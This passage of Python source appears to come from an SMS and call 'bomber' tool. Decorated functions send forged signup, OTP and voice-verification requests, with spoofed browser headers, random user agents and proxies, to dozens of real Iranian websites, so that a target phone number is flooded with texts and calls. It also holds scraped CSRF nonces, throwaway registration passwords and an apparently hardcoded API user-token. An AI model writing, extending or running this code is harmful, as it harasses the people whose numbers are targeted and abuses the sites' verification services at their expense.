    n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{num}&csrf=ec10ccb02a&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=0{num}&digits_reg_password=fuckYOU&dig_otp=&code=&dig_reg_mail=&dig_nounce=ec10ccb02a"
    rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '276','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=98','origin': 'https://bandarazad.com','referer': 'https://bandarazad.com/?login=true&page=1&redirect_to=https%3A%2F%2Fbandarazad.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
    post(proxies=proxies, url="https://bandarazad.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
                        

@handler.sms_api
def bazidone(num, proxies):
    n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo={num}&csrf=c0f5d0dcf2&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=0{num}&dig_otp=&digits_login_remember_me=1&dig_nounce=c0f5d0dcf2"
    rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '229','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=98','origin': 'https://bazidone.com','referer': 'https://bazidone.com/?login=true&page=1&redirect_to=https%3A%2F%2Fbazidone.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
    post(proxies=proxies, url="https://bazidone.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            
@handler.sms_api
def bigtoys(num, proxies):
    n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{num}&csrf=94cf3ad9a4&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%D8%A8%DB%8C%D8%A8%D9%84%DB%8C%D9%84&digregcode=%2B98&digits_reg_mail=0{num}&digregscode2=%2B98&mobmail2=&digits_reg_password=&dig_otp=&code=&dig_reg_mail=&dig_nounce=94cf3ad9a4"
    rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '351','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=98','origin': 'https://www.bigtoys.ir','referer': 'https://www.bigtoys.ir/?login=true&back=home&page=1','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
    post(proxies=proxies, url="https://www.bigtoys.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            
@handler.sms_api
def bitex24(num, proxies):
    HEADER = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','lang': 'null','origin': 'https://admin.bitex24.com','referer': 'https://admin.bitex24.com/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
    get(proxies=proxies, url=f"https://bitex24.com/api/v1/auth/sendSms?mobile=0{num}&dial_code=0", headers=HEADER)
        
@handler.sms_api
def candoosms(num, proxies):
    n4 = f"action=send_sms&phone=0{num}"
    rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '33','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.candoosms.com','referer': 'https://www.candoosms.com/signup/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
    post(proxies=proxies, url="https://www.candoosms.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            
@handler.sms_api
def farsgraphic(num, proxies):
    n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo={num}&csrf=79a35b4aa3&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%D9%86%DB%8C%D9%85%D9%86%D9%85%D9%85%D9%86%DB%8C%D8%B3&digits_reg_lastname=%D9%85%D9%86%D8%B3%DB%8C%D8%B2%D8%AA%D9%86&digregscode2=%2B98&mobmail2=&digregcode=%2B98&digits_reg_mail={num}&dig_otp=&code=&dig_reg_mail=&dig_nounce=79a35b4aa3"
    rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '413','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=98','origin': 'https://farsgraphic.com','referer': 'https://farsgraphic.com/?login=true&page=1&redirect_to=https%3A%2F%2Ffarsgraphic.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
    post(proxies=proxies, url="https://farsgraphic.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            
@handler.sms_api
def glite(num, proxies):
    n4 = f"action=logini_first&login=0{num}"
    rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '37','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.glite.ir','referer': 'https://www.glite.ir/user-login/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
    post(proxies=proxies, url="https://www.glite.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            
@handler.sms_api
def hemat(num, proxies):
    n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{num}&csrf=d33076d828&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregscode2=%2B98&mobmail2=&digregcode=%2B98&digits_reg_mail=0{num}&digits_reg_password=mahyar125&dig_otp=&code=&dig_reg_mail=&dig_nounce=d33076d828"
    rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '307','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://shop.hemat-elec.ir','referer': 'https://shop.hemat-elec.ir/?login=true&page=1&redirect_to=https%3A%2F%2Fshop.hemat-elec.ir%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
    post(proxies=proxies, url="https://shop.hemat-elec.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            
@handler.sms_api
def kodakamoz(num, proxies):
    n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{num}&csrf=18551366bc&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_lastname=%D9%84%D8%A8%D8%A8%DB%8C%DB%8C%D8%A8%D8%AB%D9%82%D8%AD&digits_reg_displayname=%D8%A8%D8%A8%D8%A8%DB%8C%D8%B1%D8%A8%D9%84%D9%84%DB%8C%D8%A8%D9%84&digregscode2=%2B98&mobmail2=&digregcode=%2B98&digits_reg_mail=0{num}&digits_reg_password=&digits_reg_avansbirthdate=2003-03-21&jalali_digits_reg_avansbirthdate1867119037=1382-01-01&dig_otp=&code=&dig_reg_mail=&dig_nounce=18551366bc"
    rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '554','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.kodakamoz.com','referer': 'https://www.kodakamoz.com/?login=true&page=1&redirect_to=https%3A%2F%2Fwww.kodakamoz.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
    post(proxies=proxies, url="https://www.kodakamoz.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            
@handler.sms_api
def mipersia(num, proxies):
    n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{num}&csrf=2d39af0a72&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=0{num}&digregscode2=%2B98&mobmail2=&dig_otp=&code=&dig_reg_mail=&dig_nounce=2d39af0a72"
    rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '277','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=98','origin': 'https://www.mipersia.com','referer': 'https://www.mipersia.com/?login=true&page=1&redirect_to=https%3A%2F%2Fwww.mipersia.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
    post(proxies=proxies, url="https://www.mipersia.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            
@handler.sms_api
def novibook(num, proxies):
    n4 = f"phone=0{num}"
    rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '26','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'language=fa; currency=RLS','origin': 'https://novinbook.com','referer': 'https://novinbook.com/index.php?route=account/phone','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
    post(proxies=proxies, url="https://novinbook.com/index.php?route=account/phone",data=n4, headers=rhead)
            
@handler.sms_api
def offch(num, proxies):
    n4 = {"username":"0"+num}
    rhead = {'user-agent': generate_user_agent()}
    post(proxies=proxies, url="https://api.offch.com/auth/otp",json=n4, headers=rhead)

@handler.sms_api
def sabziman(num, proxies):
    n4 = f"action=newphoneexist&phonenumber=0{num}"
    rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '44','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://sabziman.com','referer': 'https://sabziman.com/%D8%B3%D9%88%D8%A7%D9%84%D8%A7%D8%AA-%D9%85%D8%AA%D8%AF%D8%A7%D9%88%D9%84/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
    post(proxies=proxies, url="https://sabziman.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)

@handler.sms_api
def tajtehran(num, proxies):
    n4 = f"mobile=0{num}&password=mamad1234"
    rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '37','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://tajtehran.com','referer': 'https://tajtehran.com/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
    post(proxies=proxies, url="https://tajtehran.com/RegisterRequest",data=n4, headers=rhead)

@handler.call_api
def mrbilitcall(num, proxies):
    get(proxies=proxies, url=f'https://auth.mrbilit.com/api/Token/send/byCall?mobile=0{num}',
    )    

@handler.call_api
def tezolmarket(num, proxies):
    persian = get(f"https://api.codebazan.ir/adad/?text={num}").json()
    get('https://www.tezolmarket.com/Account/Login',
            f'PhoneNumber=۰{persian["result"]["fa"]}&SendCodeProcedure=1')

@handler.call_api
def gap(num, proxies):
    get(proxies=proxies, url=f'https://core.gap.im/v1/user/resendCode.json?mobile=%2B98{num}&type=IVR')

@handler.call_api
def novinbook(num, proxies):
    post(proxies=proxies, url="https://novinbook.com/index.php?route=account/phone",data=f"phone=0{num}&call=yes",headers={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '26','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'language=fa; currency=RLS','origin': 'https://novinbook.com','referer': 'https://novinbook.com/index.php?route=account/phone','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'})

@handler.call_api
def azki(num, proxies):
    get(proxies=proxies, url=f"https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=0{num}", headers={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','device': 'web','deviceid': '6','referer': 'https://www.azki.com/','sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'user-name': 'null','user-token': '2ub07qJQnuG7w1NtXMifm1JeKnKSJzBKnIosaF0FnM8mVfwWAAV4Ae9cMu3JxskL'})

@handler.call_api
def trip(num, proxies):
    rhead = {"content-type": "application/json;charset=UTF-8","sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"","accept": "application/json, text/plain, */*","accept-language": "fa-IR","user-agent": generate_user_agent(os="android"),"sec-ch-ua-platform": "\"Android\"","origin": "https://www.trip.ir","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.trip.ir/","accept-encoding": "gzip, deflate, br","host": "gateway.trip.ir"}
    #Call&sms

    post(proxies=proxies, url="https://gateway.trip.ir/api/registers", headers=rhead, json={"CellPhone":"0"+num})
    post(proxies=proxies, url="https://gateway.trip.ir/api/Totp", headers=rhead, json={"PhoneNumber": "0"+num})

@handler.call_api
def paklean(num, proxies):
    n4 = {"username": "0"+num}
    rhead = {"user-agent": generate_user_agent()}
    post(proxies=proxies, url="https://client.api.paklean.com/user/resendVoiceCode", json=n4, headers=rhead)

@handler.call_api
def ragham(num, proxies):
    n4 = {"phone": "+98"+num}
    rhead = {"user-agent": generate_user_agent()}
    post(proxies=proxies, url="https://web.raghamapp.com/api/users/code",json=n4, headers=rhead)